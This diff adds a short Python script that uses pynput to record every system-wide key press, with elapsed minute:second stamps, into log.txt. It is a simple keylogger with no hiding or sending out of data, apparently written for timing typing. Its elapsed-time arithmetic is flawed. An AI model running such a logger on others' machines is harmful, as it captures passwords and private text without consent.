@@ -1,0 +1,41 @@
+from pynput.keyboard import Listener
+import datetime
+import time
+start_beta = time.gmtime()
+s_second = start_beta[5]
+s_minute = start_beta[4]
+
+def write_to_file(key):
+    
+    import time
+    letter = str(key)
+    letter = letter.replace("'", "")
+
+    if letter == "Key.space":
+        letter = "space"
+    if letter == "Key.shift_l":
+        letter = "shift"
+    if letter == "Key.ctrl_l":
+        letter = "control"
+    if letter == "Key.enter":
+        letter = "enter"
+
+    with open("log.txt", "a") as f:
+        end_beta = time.gmtime()
+        e_second = end_beta[5]
+        e_minute = end_beta[4]
+        second = abs(e_second-s_second)
+        minute = abs(e_minute-s_minute)
+        # print("Start:",start)
+        # print("End", end)
+        # print(end-start)
+        print(str(minute),":",str(second))
+        
+        f.write(letter + "," + str(minute) + ":" + str(second) + "," + "\n")
+       
+
+
+# Collecting events until stopped
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
